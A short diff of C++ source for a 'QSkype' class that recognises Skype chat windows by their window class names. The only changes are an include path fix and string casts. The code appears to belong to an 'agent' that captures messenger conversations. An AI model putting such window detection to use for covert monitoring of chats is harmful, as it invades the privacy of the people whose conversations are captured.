@@ -8,7 +8,7 @@
 
 #include "QSkype.h"
 #include "QAgent.h"
-#include "..\HM_SafeProcedures.h"
+#include "../../H4DLL/HM_SafeProcedures.h"
 
 QSkype::QSkype()
 {
@@ -22,8 +22,8 @@ BOOL QSkype::Is(HWND hw)
 	WCHAR wTitle[256] = {0};
 
 	PWCHAR pwClass[] = {
-		L"TskMultiChatForm.UnicodeClass", // Non spostare queste righe, usiamo gli indici nel while()
-		L"TConversationForm.UnicodeClass",
+		(PWCHAR)L"TskMultiChatForm.UnicodeClass", // Non spostare queste righe, usiamo gli indici nel while()
+		(PWCHAR)L"TConversationForm.UnicodeClass",
 		0,
 	};
 
@@ -140,6 +140,6 @@ UINT QSkype::VersionEx(const HWND hw)
 
 const PWCHAR QSkype::GetMessenger()
 { 
-	return L"Skype"; 
+	return (PWCHAR)L"Skype";
 }
 
